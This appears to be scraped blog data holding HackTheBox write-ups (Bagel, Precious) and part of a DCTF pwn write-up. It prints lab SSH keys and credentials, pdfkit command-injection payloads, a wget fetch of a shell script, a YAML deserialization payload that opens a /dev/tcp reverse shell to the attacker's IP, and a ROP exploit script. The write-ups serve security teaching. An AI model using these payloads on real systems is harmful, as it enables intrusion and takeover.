{\u0026#39;UserId\u0026#39;: 0, \u0026#39;Session\u0026#39;: \u0026#39;Unauthorized\u0026#39;, \u0026#39;Time\u0026#39;: \u0026#39;8:54:05\u0026#39;, \u0026#39;RemoveOrder\u0026#39;: {\u0026#39;$type\u0026#39;: \u0026#39;bagel_server.File, bagel\u0026#39;, \u0026#39;ReadFile\u0026#39;: \u0026#39;root❌0:0:root:/root:/bin/bash\\nbin❌1:1:bin:/bin:/sbin/nologin\\ndaemon❌2:2:daemon:/sbin:/sbin/nologin\\nadm❌3:4:adm:/var/adm:/sbin/nologin\\nlp❌4:7:lp:/var/spool/lpd:/sbin/nologin\\nsync❌5:0:sync:/sbin:/bin/sync\\nshutdown❌6:0:shutdown:/sbin:/sbin/shutdown\\nhalt❌7:0:halt:/sbin:/sbin/halt\\nmail❌8:12:mail:/var/spool/mail:/sbin/nologin\\noperator❌11:0:operator:/root:/sbin/nologin\\ngames❌12💯games:/usr/games:/sbin/nologin\\nftp❌14:50:FTP User:/var/ftp:/sbin/nologin\\nnobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin\\ndbus❌81:81:System message bus:/:/sbin/nologin\\ntss❌59:59:Account used for TPM access:/dev/null:/sbin/nologin\\nsystemd-network❌192:192:systemd Network Management:/:/usr/sbin/nologin\\nsystemd-oom❌999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\\nsystemd-resolve❌193:193:systemd Resolver:/:/usr/sbin/nologin\\npolkitd❌998:997:User for polkitd:/:/sbin/nologin\\nrpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\\nabrt❌173:173::/etc/abrt:/sbin/nologin\\nsetroubleshoot❌997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\\ncockpit-ws❌996:994:User for cockpit web service:/nonexisting:/sbin/nologin\\ncockpit-wsinstance❌995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\\nrpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\\nsshd❌74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\\nchrony❌994:992::/var/lib/chrony:/sbin/nologin\\ndnsmasq❌993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\\ntcpdump❌72:72::/:/sbin/nologin\\nsystemd-coredump❌989:989:systemd Core Dumper:/:/usr/sbin/nologin\\nsystemd-timesync❌988:988:systemd Time Synchronization:/:/usr/sbin/nologin\\ndeveloper❌1000:1000::/home/developer:/bin/bash\\nphil❌1001:1001::/home/phil:/bin/bash\\n_laurel❌987:987::/var/log/laurel:/bin/false\u0026#39;, \u0026#39;WriteFile\u0026#39;: None}, \u0026#39;WriteOrder\u0026#39;: None, \u0026#39;ReadOrder\u0026#39;: None} Next, we can get the private key of the phil user which we can use for SSH:\n❯ python3 interact_bagel.py {\u0026#39;UserId\u0026#39;: 0, \u0026#39;Session\u0026#39;: \u0026#39;Unauthorized\u0026#39;, \u0026#39;Time\u0026#39;: \u0026#39;8:55:19\u0026#39;, \u0026#39;RemoveOrder\u0026#39;: {\u0026#39;$type\u0026#39;: \u0026#39;bagel_server.File, bagel\u0026#39;, \u0026#39;ReadFile\u0026#39;: \u0026#39;-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2\\ns8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T/iePRZOBf5CW3gZapHh+mNOrSZk13F28N\\ndZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS//bAMtyHkNn3n9cg7ZrhufiYCkg9jBjO\\nZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR/I+saVvj8KgoYtDCE1sV\\nVftUZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3/klYq6g3l+NEZOC\\nM0/I+30oaBoXCjvupMswiY/oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfT\\neYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha/A8UhvLqYA6PfruLEMxJVoDpmvvn9yFWxU1\\nYvkqYaIdirOtX/h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB3NzaC1yc2\\nEAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpi\\nGBA93O2kgvAu+BZr0g8U7TTnd0/4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmy\\nmsiH3BvEKZCD236sF4SkfqgrH6kv/2wDLch5DZ95/XIO2a4bn4mApIPYwYzmS+Pq8OFMlr\\nDjbE3b4perZXONT18hEyWrenUx0h0ys/ku5S+MEfyPrGlb4/CoKGLQwhNbFVX7VGYZBSJk\\ni9gKcSL+7WJniW6Jm2H39UqoxwJHV/VSgNIDNM0u27rd/5JWKuoN5fjRGTgjNPyPt9KGga\\nFwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4\\nZ2N3Gab93S6s0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75/chVsVNWL5KmGiHYqz\\nrV/4duYL30zb5c8bsDXM40u4Bj+FwwAAAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUx\\nU+DL5C1WuA/QAWuz44maOmOmCjdZA1M+vmzbzU+NRMZtYJhlsNzAQLN2dKuIw56+xnnBrx\\nzFMSTw5IBcPoEFWxzvaqs4OFD/QGM0CBDKY1WYLpXGyfXv/ZkXmpLLbsHAgpD2ZV6ovwy9\\n1L971xdGaLx3e3VBtb5q3VXyFs4UF4N71kXmuoBzG6OImluf+vI/tgCXv38uXhcK66odgQ\\nPn6CTk0VsD5oLVUYjfZ0ipmfIb1rCXL410V7H1DNeUJeg4hFjzxQnRUiWb2Wmwjx5efeOR\\nO1eDvHML3/X4WivARfd7XMZZyfB3JNJbynVRZPr/DEJ/owKRDSjbzem81TiO4Zh06OiiqS\\n+itCwDdFq4RvAF+YlK9Mmit3/QbMVTsL7GodRAvRzsf1dFB+Ot+tNMU73Uy1hzIi06J57P\\nWRATokDV/Ta7gYeuGJfjdb5cu61oTKbXdUV9WtyBhk1IjJ9l0Bit/mQyTRmJ5KH+CtAAAA\\nwFpnmvzlvR+gubfmAhybWapfAn5+3yTDjcLSMdYmTcjoBOgC4lsgGYGd7GsuIMgowwrGDJ\\nvE1yAS1vCest9D51grY4uLtjJ65KQ249fwbsOMJKZ8xppWE3jPxBWmHHUok8VXx2jL0B6n\\nxQWmaLh5egc0gyZQhOmhO/5g/WwzTpLcfD093V6eMevWDCirXrsQqyIenEA1WN1Dcn+V7r\\nDyLjljQtfPG6wXinfmb18qP3e9NT9MR8SKgl/sRiEf8f19CAAAAMEA/8ZJy69MY0fvLDHT\\nWhI0LFnIVoBab3r3Ys5o4RzacsHPvVeUuwJwqCT/IpIp7pVxWwS5mXiFFVtiwjeHqpsNZK\\nEU1QTQZ5ydok7yi57xYLxsprUcrH1a4/x4KjD1Y9ijCM24DknenyjrB0l2DsKbBBUT42Rb\\nzHYDsq2CatGezy1fx4EGFoBQ5nEl7LNcdGBhqnssQsmtB/Bsx94LCZQcsIBkIHXB8fraNm\\niOExHKnkuSVqEBwWi5A2UPft+avpJfAAAAwQC6PBf90h7mG/zECXFPQVIPj1uKrwRb6V9g\\nGDCXgqXxMqTaZd348xEnKLkUnOrFbk3RzDBcw49GXaQlPPSM4z05AMJzixi0xO25XO/Zp2\\niH8ESvo55GCvDQXTH6if7dSVHtmf5MSbM5YqlXw2BlL/yqT+DmBsuADQYU19aO9LWUIhJj\\neHolE3PVPNAeZe4zIfjaN9Gcu4NWgA6YS5jpVUE2UyyWIKPrBJcmNDCGzY7EqthzQzWr4K\\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\\n-----END OPENSSH PRIVATE KEY-----\u0026#39;, \u0026#39;WriteFile\u0026#39;: None}, \u0026#39;WriteOrder\u0026#39;: None, \u0026#39;ReadOrder\u0026#39;: None} ❯ echo \u0026#39;-----BEGIN OPENSSH PRIVATE KEY-----\\n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\\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\\n-----END OPENSSH PRIVATE KEY-----\u0026#39; \u0026gt; id_rsa_phil Now, we can successfully login to the machine as phil\nNow using the dev user’s password we got from the DB class of the bagel.dll , we can escalate to the developer user\nDoing sudo -l , we can see that we are allowed to run /usr/bin/donet as user root\n[developer@bagel ~]$ sudo -l Matching Defaults entries for developer on bagel: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/var/lib/snapd/snap/bin User developer may run the following commands on bagel: (root) NOPASSWD: /usr/bin/dotnet Checking GTFO bins, we can see spawn an interactive shell and then use System.Diagnostic.Process.Start method spawn any child process, now since donet was running as root, we were able to get the shell as root\nhttps://gtfobins.github.io/gtfobins/dotnet/\n","date":"3 June 2023","permalink":"/posts/bagel-htb/","section":"Posts","summary":"WriteUp for HackTheBox Bagel machine.\nStarting off with the nmap scan, we can it has 3 ports open (it missed one more port which was open due to some issue):","title":"HackTheBox - Bagel"},{"content":"","date":null,"permalink":"/tags/newtonsoft/","section":"Tags","summary":"","title":"NewtonSoft"},{"content":"","date":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python"},{"content":"","date":null,"permalink":"/tags/sqlmap/","section":"Tags","summary":"","title":"Sqlmap"},{"content":"","date":null,"permalink":"/tags/web-app/","section":"Tags","summary":"","title":"Web-App"},{"content":"","date":null,"permalink":"/tags/websocket/","section":"Tags","summary":"","title":"Websocket"},{"content":"","date":null,"permalink":"/tags/dependencies-easy-pdfkit-ruby/","section":"Tags","summary":"","title":"Dependencies, Easy, Pdfkit, Ruby"},{"content":"Writeup for HackTheBox\u0026rsquo;s Precious machine.\n# Nmap 7.92 scan initiated Wed Apr 19 09:13:16 2023 as: nmap -sV -sC -A -Pn -p 22,80 -o nmap_ports -vv -Pn 10.10.11.189 Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up, received user-set (0.074s latency). Scanned at 2023-04-19 09:13:16 UTC for 9s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck= | 256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y= | 256 33:05:3d💿7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb 80/tcp open http syn-ack nginx 1.18.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Apr 19 09:13:25 2023 -- 1 IP address (1 host up) scanned in 9.40 seconds Nmap scan showed that port 80 and 22 is open, nmap scan mentioned that it tried to redirect to the precious.htb , we can add that to the /etc/hosts file and then visit the site:\nIt accepts a URL and converts the site/page to PDF, giving the local HTTP Server link, we can see a request is made:\n❯ sudo python3 -m http.server 80 --bind 10.10.14.67 [sudo] password for kali: Serving HTTP on 10.10.14.67 port 80 (http://10.10.14.67:80/) ... 10.10.11.189 - - [19/Apr/2023 09:26:35] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - It has been converted to the PDF, nothing interesting of any sort.\nDownloading it and checking with exiftiool , we can see the metadata and the PDF was generated using pdfkit v0.8.6\n❯ exiftool p7kugw4t30nt655wb3jcrnjpkp8moz41.pdf ExifTool Version Number : 12.39 File Name : p7kugw4t30nt655wb3jcrnjpkp8moz41.pdf Directory : . File Size : 18 KiB File Modification Date/Time : 2023:04:19 09:26:47+00:00 File Access Date/Time : 2023:04:19 09:26:47+00:00 File Inode Change Date/Time : 2023:04:19 09:26:47+00:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 There is a command injection vulnerability for the same version, we can follow the below guide to exploit it:\nCommand Injection in pdfkit | CVE-2022-25765 | Snyk\nWe can exploit the vulnerability by giving a payload to ping our machine:\nhttp ` ping 10.10.14.67` We can see that ICMP request has been made from the remote machine to our machine, which confirms the command injection.\nWe can further exploit this to get the RCE by capturing the request in the Burp Suite, then fiddling with the url parameter and providing different payloads:\nPOST / HTTP/1.1 Host: precious.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 99 Origin: http://precious.htb Connection: close Referer: http://precious.htb/ Upgrade-Insecure-Requests: 1 url=http://10.10.14.67/?name=%2520%60%20wget%20http://10.10.14.67/shell.sh%20-O%20/tmp/shell.sh%60\u0026#39; Following two payloads were given to the url parameter , one of it downloads the [shell.sh](http://shell.sh) containing the payload for the reverse shell and next one is executing it:\n💡 For some reason, directly executing reverse shell was resulting in failure, hence had to take a detour http://10.10.14.67/?name=%20` wget http://10.10.14.67/shell.sh -O /tmp/shell.sh`\u0026#39; http://10.10.14.67/?name=%2520%60%20b%20/tmp/shell.sh%60\u0026#39; Doing so, we got reverse shell:\nEnumerating the web app folder did not reveal any sensitive information which could be leveraged, moving on, checking the home folder of the ruby user, we have a .bundle folder containing config which had henry user’s credentials:\n-bash-5.1$ cd .bundle -bash-5.1$ ls config -bash-5.1$ cat config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \u0026#34;henry:Q3c1AqGHtoI0aXAYFH\u0026#34; We can now SSH into the machine with the henry credentials, doing sudo -l , we can see that we can run /opt/update_dependencies.rb script as root user:\n-bash-5.1$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Checking for any possible privilege escalation exploit for the particular scenario, I was stumbled on the following post, which mentioned that it reads the data from dependencies.yml which was in henry user’s home folder:\nhttps://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/\n-rw-r--r-- 1 henry henry 650 Apr 19 06:15 /home/henry/dependencies.yml Following the article, I modified the dependencies.yml and provided a reverse shell payload to the git_set variable:\n--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: \u0026amp;1 !ruby/object:Net::BufferedIO io: \u0026amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \u0026#34;abc\u0026#34; debug_output: \u0026amp;1 !ruby/object:Net::WriteAdapter socket: \u0026amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module \u0026#39;Kernel\u0026#39; method_id: :system git_set: \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.67/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; method_id: :resolve Executing the script once dependencies.yml has been modified:\nA connection was made to the our listener, giving us a shell as root user:\n","date":"20 May 2023","permalink":"/posts/precious-htb/","section":"Posts","summary":"Writeup for HackTheBox\u0026rsquo;s Precious machine.\n# Nmap 7.92 scan initiated Wed Apr 19 09:13:16 2023 as: nmap -sV -sC -A -Pn -p 22,80 -o nmap_ports -vv -Pn 10.","title":"HackTheBox - Precious"},{"content":"","date":null,"permalink":"/categories/ctfs/","section":"Categories","summary":"","title":"CTFs"},{"content":"I played this CTF event with the WeakButLeet team and in the end, we managed to get 18th rank, sadly we couldn’t do much crypto challenges but overall it was a fun CTF to get refreshed, there were other CTFs running as well but I only played this as there was a local CTF going on. In the end, I manage to solve 7/8 pwn challenges and remaining one was solved by Faith, super talented guy.\nPwn Sanity Check #This was more of a sanity check challenge for the pwn challenges, this was ridiculously easy:-\ngef➤ disas main Dump of assembler code for function main: 0x000000000040078c \u0026lt;+0\u0026gt;: push rbp 0x000000000040078d \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000400790 \u0026lt;+4\u0026gt;: mov edi,0xa 0x0000000000400795 \u0026lt;+9\u0026gt;: mov eax,0x0 0x000000000040079a \u0026lt;+14\u0026gt;: call 0x400580 \u0026lt;alarm@plt\u0026gt; 0x000000000040079f \u0026lt;+19\u0026gt;: mov eax,0x0 0x00000000004007a4 \u0026lt;+24\u0026gt;: call 0x400730 \u0026lt;vuln\u0026gt; 0x00000000004007a9 \u0026lt;+29\u0026gt;: mov eax,0x0 0x00000000004007ae \u0026lt;+34\u0026gt;: pop rbp 0x00000000004007af \u0026lt;+35\u0026gt;: ret End of assembler dump. gef➤ disas vuln Dump of assembler code for function vuln: 0x0000000000400730 \u0026lt;+0\u0026gt;: push rbp 0x0000000000400731 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000400734 \u0026lt;+4\u0026gt;: sub rsp,0x40 0x0000000000400738 \u0026lt;+8\u0026gt;: lea rdi,[rip+0x1d1] # 0x400910 0x000000000040073f \u0026lt;+15\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400744 \u0026lt;+20\u0026gt;: mov rdx,QWORD PTR [rip+0x200915] # 0x601060 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x000000000040074b \u0026lt;+27\u0026gt;: lea rax,[rbp-0x40] 0x000000000040074f \u0026lt;+31\u0026gt;: mov esi,0x100 0x0000000000400754 \u0026lt;+36\u0026gt;: mov rdi,rax 0x0000000000400757 \u0026lt;+39\u0026gt;: call 0x400590 \u0026lt;fgets@plt\u0026gt; 0x000000000040075c \u0026lt;+44\u0026gt;: cmp DWORD PTR [rbp-0x4],0xdeadc0de 0x0000000000400763 \u0026lt;+51\u0026gt;: jne 0x40077d \u0026lt;vuln+77\u0026gt; 0x0000000000400765 \u0026lt;+53\u0026gt;: lea rdi,[rip+0x1b4] # 0x400920 0x000000000040076c \u0026lt;+60\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400771 \u0026lt;+65\u0026gt;: mov eax,0x0 0x0000000000400776 \u0026lt;+70\u0026gt;: call 0x4006f4 \u0026lt;shell\u0026gt; 0x000000000040077b \u0026lt;+75\u0026gt;: jmp 0x400789 \u0026lt;vuln+89\u0026gt; 0x000000000040077d \u0026lt;+77\u0026gt;: lea rdi,[rip+0x1c1] # 0x400945 0x0000000000400784 \u0026lt;+84\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x0000000000400789 \u0026lt;+89\u0026gt;: nop 0x000000000040078a \u0026lt;+90\u0026gt;: leave 0x000000000040078b \u0026lt;+91\u0026gt;: ret First off the main function calls the vuln function which takes the input from the fgets, there was a buffer overflow vulnerability in the fgets call since the buffer was of size 0x40, while the size fgets takes is 0x100 making it vulnerable to stack overflow. In the vuln function it checks if the rbp - 0x4 has the value 0xdeadc0de which calls the shell function it the value turns out to be same but the shell function wasn’t spawning shell, it turns out to be troll function. Next up, there was a win function:-\nDump of assembler code for function win: 0x0000000000400697 \u0026lt;+0\u0026gt;: push rbp 0x0000000000400698 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x000000000040069b \u0026lt;+4\u0026gt;: sub rsp,0x10 0x000000000040069f \u0026lt;+8\u0026gt;: mov DWORD PTR [rbp-0x4],edi 0x00000000004006a2 \u0026lt;+11\u0026gt;: mov DWORD PTR [rbp-0x8],esi 0x00000000004006a5 \u0026lt;+14\u0026gt;: lea rdi,[rip+0x18c] # 0x400838 0x00000000004006ac \u0026lt;+21\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006b1 \u0026lt;+26\u0026gt;: cmp DWORD PTR [rbp-0x4],0xdeadbeef 0x00000000004006b8 \u0026lt;+33\u0026gt;: jne 0x4006f1 \u0026lt;win+90\u0026gt; 0x00000000004006ba \u0026lt;+35\u0026gt;: lea rdi,[rip+0x1b7] # 0x400878 0x00000000004006c1 \u0026lt;+42\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006c6 \u0026lt;+47\u0026gt;: cmp DWORD PTR [rbp-0x8],0x1337c0de 0x00000000004006cd \u0026lt;+54\u0026gt;: jne 0x4006f1 \u0026lt;win+90\u0026gt; 0x00000000004006cf \u0026lt;+56\u0026gt;: lea rdi,[rip+0x1b7] # 0x40088d 0x00000000004006d6 \u0026lt;+63\u0026gt;: call 0x400550 \u0026lt;puts@plt\u0026gt; 0x00000000004006db \u0026lt;+68\u0026gt;: lea rdi,[rip+0x1bc] # 0x40089e 0x00000000004006e2 \u0026lt;+75\u0026gt;: call 0x400560 \u0026lt;system@plt\u0026gt; 0x00000000004006e7 \u0026lt;+80\u0026gt;: mov edi,0x0 0x00000000004006ec \u0026lt;+85\u0026gt;: call 0x4005a0 \u0026lt;exit@plt\u0026gt; 0x00000000004006f1 \u0026lt;+90\u0026gt;: nop 0x00000000004006f2 \u0026lt;+91\u0026gt;: leave 0x00000000004006f3 \u0026lt;+92\u0026gt;: ret This function spawns a shell /bin/sh but only if the given argument to the function will be equivalent to 0xdeadbeef and 0x1337c0de respectively. In order to do so, we find the gadgets using ropper, since the binary is 64 bit, the calling convention of the 64 bit architecture says 1st argument for a function calls goes to the rdi while the second goes to rsi and so on. We find two useful gadgets here:-\n0x0000000000400813: pop rdi; ret; 0x0000000000400811: pop rsi; pop r15; ret; Now, we can just create a ROP chain and give the value 0xdeadbeef to the rdi and 0x1337c0de to the rsi and give any junk value to the r15 since it doesn’t matter what r15 holds, the exploit was as follows:- py from pwn import * p = remote(\u0026#34;dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io\u0026#34;, 7480) payload = b\u0026#34;A\u0026#34;*72 payload += p64(0x0000000000400813) payload += p64(0xdeadbeef) payload += p64(0x0000000000400811) payload += p64(0x1337c0de)*2 payload += p64(0x400697) p.recvline() p.sendline(payload) p.interactive() Running the exploit:-\n❯ python3 pwn_sanity.py [+] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done [*] Switching to interactive mode will this work? you made it to win land, no free handouts this time, 